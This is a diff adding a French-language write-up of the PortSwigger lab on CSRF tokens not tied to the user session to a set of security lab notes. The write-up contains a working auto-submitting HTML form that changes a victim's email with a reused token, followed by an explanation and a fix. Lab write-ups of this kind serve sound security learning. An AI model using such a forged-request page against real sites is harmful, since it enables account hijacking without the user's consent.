@@ -118,6 +118,56 @@ L'attaque CSRF est alors possible en incluant ce token dans la requête malveill
 <hr style="height:0; border:1px white solid;" />
 <br />
 
+## CSRF where token is not tied to user session
+
+[https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)
+
+### Étapes
+
+1. Se connecter et regarder le formulaire
+2. Aller sur "le serveur d'exploit" (bouton en haut de la page)
+
+Le chall indique : "csrf token non lié à l'utilisateur"
+Chaque fois qu'on recharge la page, le token change => supposition : le token est généré par le serveur, il doit avoir un usage unique, et peut-être une date de validité
+
+On copie le formulaire :
+
+```html
+<form class="login-form" name="emailForm" action="/my-account/change-email" method="POST">
+    <label>Email</label>
+    <input required type="email" name="email" value="">
+    <input required type="hidden" name="csrf" value="[le token présent]">
+    <button class='button' type='submit'> Update email </button>
+</form>
+```
+
+On le colle dans l'exploit, on rajoute bien l'url dans l'action (ex:https://0abf00c40352c27b813d03a0009b00b0.web-security-academy.net/), on change l'email et on rajoute un script pour l'envoyer automatiquement.
+
+```html
+<form class="login-form" name="emailForm" action="https://0abf00c40352c27b813d03a0009b00b0.web-security-academy.net/my-account/change-email" method="POST">
+    <label>Email</label>
+    <input required type="email" name="email" value="test@taloche.com">
+    <input required type="hidden" name="csrf" value="bX6lrxuhzwsPkzc4Y3dVUjLhZ7VY7Cht">
+    <button class='button' type='submit'> Update email </button>
+</form>
+
+<script>
+  document.emailForm.submit();
+</script>
+```
+
+### Explication
+
+Le token CSRF n'est pas lié à la session utilisateur, il peut être réutilisé par un attaquant pour effectuer des actions au nom de l'utilisateur.
+
+### Recommandations
+
+- Lier les tokens CSRF à la session utilisateur
+
+<br />
+<hr style="height:0; border:1px white solid;" />
+<br />
+
 ## JWT - Jeton révoqué
 
 [https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque)
